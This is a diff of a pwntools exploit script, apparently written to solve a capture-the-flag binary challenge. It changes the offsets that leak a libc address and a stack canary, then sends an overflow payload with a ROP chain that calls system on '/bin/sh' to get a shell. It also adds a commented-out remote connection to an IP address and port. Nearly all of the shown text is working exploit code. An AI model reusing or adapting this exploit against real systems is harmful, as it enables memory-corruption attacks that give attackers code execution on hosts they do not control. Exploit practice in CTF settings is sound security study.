@@ -8,6 +8,7 @@ libc = ELF('./libc-2.31.so')
 context.binary = e
 
 p = process(e.path)
+#p = remote('143.198.127.103', 42003)
 
 #funcs
 
@@ -32,6 +33,8 @@ def leak(x, y):
 
 #vars
 
+n = 400
+
 setbuf_off = libc.sym['setbuffer']
 binsh_off = next(libc.search(b'/bin/sh'))
 
@@ -46,13 +49,13 @@ p.sendline('10000')
 
 #brute leak libc
 
-libc_off = u64(leak(5, 1000071)[::-1] + b'\x7f\x00\x00') - setbuf_off - 200
+libc_off = u64(leak(5, (n + 71))[::-1] + b'\x7f\x00\x00') - setbuf_off - 200
 
 log.info('Libc off adr: ' + hex(libc_off))
 
 #brute leak canary
 
-canary = u64(b'\x00' + leak(12, 1000104)[-1:-8:-1])
+canary = u64(b'\x00' + leak(12, (n + 104))[-1:-8:-1])
 
 log.info('Canary: ' + hex(canary))
 
@@ -62,7 +65,7 @@ libc.address = libc_off
 rop = ROP(libc)
 rop.system(libc_off + binsh_off)
 
-p.sendline(b'\x00' * 1000104 + p64(canary) + b'a' * 0x8 + rop.chain())
+p.sendline(b'\x00' * (n + 104) + p64(canary) + b'a' * 0x8 + rop.chain())
 
 #pray for flag
 
